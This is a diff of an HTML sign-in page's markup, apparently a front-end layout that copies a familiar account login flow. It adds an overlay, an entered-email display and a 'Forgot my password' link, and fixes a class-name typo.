@@ -2,30 +2,31 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <link rel="icon" type="image/svg+xml"
-        href="assets/images/logo_square.ico" />
+  <link rel="icon" type="image/svg+xml" href="assets/images/logo_square.ico" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sign in to your account</title>
   <link rel="stylesheet" href="styles/style.css">
 </head>
 <body>
 <main id="main">
+  <div id="overlay" class="hidden"></div>
   <div class="main-box">
-    <img id="logo-small" class="logotype"
-         src="assets/images/logo_rect.svg"
-         alt="company logotype">
-    <div class="sing-in-title">Sign in</div>
-    <div class="sing-in-title password">Enter password</div>
-    <div id="error-message">
-      Enter a valid email address, phone number, or Skype name.
+    <img id="logo-small" class="logotype" src="assets/images/logo_rect.svg" alt="company logotype">
+    <div id="sign-in-title" class="sing-in-title">Sign in</div>
+    <div id="error-message">Enter a valid email address, phone number, or Skype name.</div>
+    <div id="entered-email">
+      <img src="assets/images/arrow(left).svg" alt="arrow left" id="arrow" />
+      <div id="enter-message"></div>
     </div>
+    <div id="enter-pass-title" class="sing-in-title password">Enter password</div>
     <input id="input-email" type="email" class="data-input" placeholder="Email, phone, or Skype">
     <input id="input-password" type="password" class="data-input" placeholder="Password">
     <div class="no-account">No account? <a class="create-account" href="#">Create one!</a></div>
     <a href="#" class="cant-access">Can't access your account?</a>
+    <a href="#" class="forgot-pass">Forgot my password</a>
     <div class="buttons-block">
       <button class="button back">Back</button>
-      <button class="button sing-in">Sign in</button>
+      <button class="button sign-in">Sign in</button>
       <button id="next-button" class="button">Next</button>
     </div>
   </div>
